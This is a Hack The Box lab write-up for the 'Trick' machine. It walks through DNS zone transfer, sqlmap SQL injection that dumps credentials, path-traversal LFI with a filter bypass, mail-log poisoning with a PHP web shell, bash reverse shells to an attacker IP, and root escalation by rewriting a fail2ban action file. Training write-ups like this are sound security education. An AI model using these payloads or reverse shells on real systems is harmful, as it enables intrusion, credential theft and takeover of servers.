@@ -1,0 +1,587 @@
+---
+title: Trick Writeup - Hack The Box
+description: Exploiting SQL injection, DNS enumeration and LFI for initial access, then leveraging fail2ban configuration for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-18
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local:~$ nmap -sVC 10.129.227.180
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-17 10:43 EEST
+Nmap scan report for 10.129.227.180
+Host is up (0.050s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
+|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
+|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)
+25/tcp open  smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid:
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+|_http-server-header: nginx/1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 256.80 seconds
+```
+
+### Nginx
+Let's visit the website: ![Website homepage](/images/blog/trick/IMG-20251017111957588.png)
+
+Submitting a random email makes no requests to the backend, and just shows the following message: ![Email submission message](/images/blog/trick/IMG-20251017112110191.png)
+The link is out of scope, so we'll just ignore it.
+
+### DNS
+Let's get the domain name with a reverse lookup:
+```console title="DNS reverse lookup"
+nontas@local:~$ dig @10.129.227.180 -x 10.129.227.180
+
+; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.227.180 -x 10.129.227.180
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35936
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 4a64a65077a261139174094a68f23934b0752658aeba02ea (good)
+;; QUESTION SECTION:
+;180.227.129.10.in-addr.arpa.   IN      PTR
+
+;; ANSWER SECTION:
+180.227.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.
+
+;; AUTHORITY SECTION:
+227.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.
+
+;; ADDITIONAL SECTION:
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+
+;; Query time: 55 msec
+;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)
+;; WHEN: Fri Oct 17 15:40:10 EEST 2025
+;; MSG SIZE  rcvd: 165
+```
+
+The domain name is `trick.htb`. Add it to `/etc/hosts`:
+```txt
+10.129.227.180 trick.htb
+```
+
+Navigating to `trick.htb` gives us the same website.
+
+The DNS server might allow zone transfers:
+```console title="Zone transfer"
+nontas@local:~$ dig axfr trick.htb @10.129.227.180
+
+; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr trick.htb @10.129.227.180
+;; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 59 msec
+;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
+;; WHEN: Fri Oct 17 15:48:32 EEST 2025
+;; XFR size: 6 records (messages 1, bytes 231)
+```
+
+<Callout title="DNS Zone Transfer" type="info">
+DNS servers usually run on **UDP 53**. This one runs on TCP in order to do zone transfers
+</Callout>
+
+We found a new domain name `preprod-payroll.trick.htb`. Add it to `/etc/hosts` as well.
+
+### SQL Injection
+Visiting `preprod-payroll.trick.htb`, we see a login form: ![Login form](/images/blog/trick/IMG-20251017160340779.png)
+
+Submitting random credentials shows "Username or Password is incorrect": ![Login error](/images/blog/trick/IMG-20251017160517984.png)
+
+Looking at the source code, the title of the page is:
+```html
+<title>Admin | Employee's Payroll Management System</title>
+```
+Despite the look of the page, it's actually real software.
+
+I'll run `SQLMap` with the `POST` request saved to `trick.req`:
+```http
+POST /ajax.php?action=login HTTP/1.1
+Host: preprod-payroll.trick.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 31
+Origin: http://preprod-payroll.trick.htb
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://preprod-payroll.trick.htb/login.php
+Cookie: PHPSESSID=c575117t95n0una66brmk5avr9
+Priority: u=0
+
+username=nontas&password=123456
+```
+
+```console title="SQLMap initial scan"
+nontas@local:~$ sqlmap -r trick.req --batch                                        ___
+<SNIP>
+sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=nontas' AND (SELECT 7047 FROM (SELECT(SLEEP(5)))QquE) AND 'JdZL'='JdZL&password=123456
+---
+[16:17:25] [INFO] the back-end DBMS is MySQL
+<SNIP>
+```
+
+It found a vulnerability, but time-based SQL injection is slow, so we'll try to find a better vulnerability:
+```console title="Advanced SQLMap scan"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch
+<SNIP>
+sqlmap identified the following injection point(s) with a total of 440 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=nontas' OR NOT 2798=2798-- ETaE&password=123456
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=nontas' OR (SELECT 3326 FROM(SELECT COUNT(*),CONCAT(0x716b627871,(SELECT (ELT(3326=3326,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LeLT&password=123456
+---
+<SNIP>
+```
+We have 2 more (faster) techniques we can use.
+
+List the DBs:
+```console title="List databases"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch --dbs
+<SNIP>
+available databases [2]:
+[*] information_schema
+[*] payroll_db
+<SNIP>
+```
+
+List the tables inside `payroll_db`:
+```console title="List tables"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch -D payroll_db --tables
+<SNIP>
+Database: payroll_db
+[11 tables]
++---------------------+
+| position            |
+| allowances          |
+| attendance          |
+| deductions          |
+| department          |
+| employee            |
+| employee_allowances |
+| employee_deductions |
+| payroll             |
+| payroll_items       |
+| users               |
++---------------------+
+<SNIP>
+```
+
+The `users` table seems interesting. Dump the rows inside it:
+```console title="Dump users table"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch -D payroll_db -T users --dump
+<SNIP>
+Database: payroll_db
+Table: users
+[1 entry]
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| id | doctor_id | name          | type   | address | contact | password              | username   |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+<SNIP>
+```
+
+We found the credentials `Enemigosss:SuperGucciRainbowCake`
+
+<Callout title="Manual SQLi Alternative" type="info">
+If you didn't want to use `sqlmap`, you could've just manually performed SQLi: ![Manual SQLi](/images/blog/trick/IMG-20251017172117628.png)
+</Callout>
+
+And we get access to the "Recruitment Management System": ![Dashboard access](/images/blog/trick/IMG-20251017172234958.png)
+
+Unfortunately, there's nothing interesting in this dashboard.
+
+### LFI via SQLMap
+We can keep using `sqlmap` to check if the system is vulnerable to LFI (Local File Inclusion).
+
+First, list the privileges that the DB user has with `--privileges`:
+```console title="Check DB privileges"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch --privileges
+<SNIP>
+database management system users privileges:
+[*] 'remo'@'localhost' [1]:
+    privilege: FILE
+<SNIP>
+```
+The DB user has the `FILE` privilege, which means we can potentially read system files.
+
+Let's attempt to read `/etc/passwd`:
+```console title="Read /etc/passwd"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch --file-read "/etc/passwd"
+<SNIP>
+remote file '/etc/passwd' have the same size (2351 B)
+files saved to [1]:
+[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
+<SNIP>
+nontas@local:~$ cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+root:x:0:0:root:/root:/bin/bash
+<SNIP>
+michael:x:1001:1001::/home/michael:/bin/bash
+```
+
+We were successful and we found the user `michael`.
+
+Since the web server is running `Nginx`, we can attempt to read `/etc/nginx/sites-enabled/default`:
+```console title="Read nginx config"
+nontas@local:~$ sqlmap -r trick.req --technique=BEUS --level 5 --risk 3 --batch --file-read "/etc/nginx/sites-enabled/default"
+<SNIP>
+[17:33:02] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
+files saved to [1]:
+[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)
+<SNIP>
+```
+
+```nginx
+server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+        server_name trick.htb;
+        root /var/www/html;
+
+        index index.html index.htm index.nginx-debian.html;
+
+        server_name _;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+        }
+}
+
+
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name preprod-marketing.trick.htb;
+
+        root /var/www/market;
+        index index.php;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+        }
+}
+
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name preprod-payroll.trick.htb;
+
+        root /var/www/payroll;
+        index index.php;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+        }
+}
+```
+
+There's a new domain name: `preprod-marketing.trick.htb`, add it to `/etc/hosts`.
+
+### Directory Traversal (LFI)
+Let's visit the website: ![Marketing website](/images/blog/trick/IMG-20251017174046368.png)
+
+There's a contact form: ![Contact form](/images/blog/trick/IMG-20251017174505060.png)
+
+If we look at the URL, it modifies the parameter `page` to change the currently viewed page: ![URL parameter](/images/blog/trick/IMG-20251017180448455.png)
+
+This might mean that we can perform **directory traversal** to perform LFI.
+
+Modifying the parameter to `?page=../about.html` keeps showing the "About" page, so this might mean that it's filtering the string `../`. We can verify this with `?page=about.html../`.
+
+We can bypass this filter by changing `../` to `....//`: ![Directory traversal](/images/blog/trick/IMG-20251017181123128.png)
+As we can see, the parameter `?page=....//....//....//etc/passwd` shows the `/etc/passwd` file.
+
+### Mail Include
+In order to obtain RCE, we can send a malicious email via SMTP to `michael` with PHP code, so when we include it we can execute any command.
+
+Run these commands in order:
+```bash
+$ nc trick.htb 25
+helo x # Greet server
+mail from: nontas # Sender
+rcpt to: michael # Receiver
+data # Payload
+```
+
+So in total we'll have:
+```console title="Send malicious email"
+nontas@local:~$ nc trick.htb 25
+220 debian.localdomain ESMTP Postfix (Debian/GNU)
+helo x
+250 debian.localdomain
+mail from: nontas
+250 2.1.0 Ok
+rcpt to: michael
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+<?php system($_GET["cmd"]); ?>
+.
+250 2.0.0 Ok: queued as 2FDBD4099C
+```
+Once we enter `data`, we input the PHP web shell `<?php system($_GET["cmd"]); ?>`, and finally send `.` to finalize the data being sent.
+
+The email will appear at `/var/mail/michael`, so you should be able to run any command via `?page=....//....//....//var/mail/michael&cmd=id`: ![Command execution](/images/blog/trick/IMG-20251017231310216.png)
+
+Now start a `nc` listener:
+```console
+nontas@local:~$ nc -lnvp 1234
+```
+
+And run the following reverse shell:
+```bash
+bash -c "bash -i >& /dev/tcp/10.10.14.78/1234 0>&1"
+```
+
+I'll send it via Caido so I can URL encode it: ![Reverse shell payload](/images/blog/trick/IMG-20251017231451323.png)
+
+And you should get a connection back:
+```console title="Reverse shell connection"
+nontas@local:~$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.227.180.
+Ncat: Connection from 10.129.227.180:56132.
+bash: cannot set terminal process group (713): Inappropriate ioctl for device
+bash: no job control in this shell
+michael@trick:/var/www/market$
+```
+
+Upgrade the shell:
+```console title="Shell upgrade"
+michael@trick:/var/www/market$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<et$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+michael@trick:/var/www/market$ ^Z
+[1]  + 49796 suspended  nc -lnvp 1234
+nontas@local:~$ stty raw -echo;fg
+[1]  + 49796 continued  nc -lnvp 1234
+
+michael@trick:/var/www/market$
+```
+
+And grab the user flag:
+```console
+michael@trick:/var/www/market$ cd ~
+michael@trick:~$ cat user.txt
+```
+
+## Privilege Escalation
+The user `michael` can run `/etc/init.d/fail2ban restart` as
+ sudo:
+```console title="Sudo privileges"
+michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+
+They also are a part of the group `security`:
+```console
+michael@trick:~$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+```
+
+We can search for files that are owned by the `security` group:
+```console title="Find security group files"
+michael@trick:~$ find / -group security 2>/dev/null
+/etc/fail2ban/action.d
+```
+
+This is a directory that the `security` group has `rwx` permissions on it:
+```console
+michael@trick:~$ ls -ld /etc/fail2ban/action.d
+drwxrwx--- 2 root security 4096 Oct 17 22:27 /etc/fail2ban/action.d
+```
+
+There are a bunch of files (mostly `.conf`) inside it:
+```console title="List action.d files"
+michael@trick:/etc/fail2ban/action.d$ ls -la
+total 288
+drwxrwx--- 2 root security  4096 Oct 17 22:33 .
+drwxr-xr-x 6 root root      4096 Oct 17 22:33 ..
+-rw-r--r-- 1 root root      3879 Oct 17 22:33 abuseipdb.conf
+-rw-r--r-- 1 root root       587 Oct 17 22:33 apf.conf
+-rw-r--r-- 1 root root       629 Oct 17 22:33 badips.conf
+-rw-r--r-- 1 root root     10918 Oct 17 22:33 badips.py
+-rw-r--r-- 1 root root      2631 Oct 17 22:33 blocklist_de.conf
+-rw-r--r-- 1 root root      3094 Oct 17 22:33 bsd-ipfw.conf
+-rw-r--r-- 1 root root      2719 Oct 17 22:33 cloudflare.conf
+-rw-r--r-- 1 root root      4669 Oct 17 22:33 complain.conf
+-rw-r--r-- 1 root root      7580 Oct 17 22:33 dshield.conf
+<SNIP>
+```
+
+### Fail2ban Configuration
+There's 3 parts to a `fail2ban` configuration:
+- A filter defines the patterns to look for in a given log file.
+- An action defines something that can happen (like an `iptables` rule being put in place).
+- A jail connects a filter to an action.
+
+First, look at `/etc/fail2ban/jail.conf` to understand how it's configured.
+
+There's an `sshd` section:
+```bash
+[sshd]
+
+# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
+# normal (default), ddos, extra or aggressive (combines all).
+# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
+#mode   = normal
+port    = ssh
+logpath = %(sshd_log)s
+backend = %(sshd_backend)s
+bantime = 10
+```
+
+There's also a `DEFAULT` section that applies to all services (unless overridden):
+```bash
+[DEFAULT]
+<SNIP>
+# "bantime" is the number of seconds that a host is banned.
+bantime  = 10s
+
+# A host is banned if it has generated "maxretry" during the last "findtime"
+# seconds.
+findtime  = 10s
+
+# "maxretry" is the number of failures before a host get banned.
+maxretry = 5
+<SNIP>
+banaction = iptables-multiport
+banaction_allports = iptables-allports
+<SNIP>
+```
+
+The ban action is to run `iptables-multiport`, so we should look at `/etc/fail2ban/action.d/iptable-multiport.conf`:
+```bash
+<SNIP>
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+```
+
+The command being run bans our IP. We can attempt to modify it in order to escalate our privileges. However, we don't have access to modify the file since it's owned by `root:root`. But since we have `rwx` permissions on the parent directory, we can create a new `iptable-multiport.conf`:
+```console title="Replace config file"
+michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf old.conf
+michael@trick:/etc/fail2ban/action.d$ cp old.conf iptables-multiport.conf
+michael@trick:/etc/fail2ban/action.d$ ls -l iptables-multiport.conf
+-rw-r--r-- 1 michael michael 1420 Oct 17 22:58 iptables-multiport.conf
+```
+
+Now create a malicious script `/tmp/shell.sh`:
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.78/4321 0>&1
+```
+
+Make the script executable:
+```console
+michael@trick:/etc/fail2ban/action.d$ chmod +x /tmp/shell.sh
+```
+
+We'll modify `iptable-multiport.conf` to execute that script:
+```
+actionban = /tmp/shell.sh
+```
+
+And finally, restart the `fail2ban` service:
+```console title="Restart fail2ban"
+michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+```
+
+Now, make some failed attempts to SSH into the server:
+```console title="Trigger fail2ban"
+nontas@local:~$ ssh michael@trick.htb
+michael@trick.htb's password:
+Permission denied, please try again.
+michael@trick.htb's password:
+Permission denied, please try again.
+<SNIP>
+```
+
+And you should have your listener connect:
+```console title="Root shell"
+nontas@local:~$ nc -lnvp 4321
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4321
+Ncat: Listening on 0.0.0.0:4321
+Ncat: Connection from 10.129.227.180.
+Ncat: Connection from 10.129.227.180:47196.
+bash: cannot set terminal process group (6828): Inappropriate ioctl for device
+bash: no job control in this shell
+root@trick:/# cat /root/root.txt
+```
+
+<Callout title="Alternative Privilege Escalation" type="info">
+You can also run this command:
+```bash
+cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash
+```
+So once you trigger `fail2ban`, all you need to do is `/tmp/shell -p`
+</Callout>
+
+We have successfully completed **Trick**!
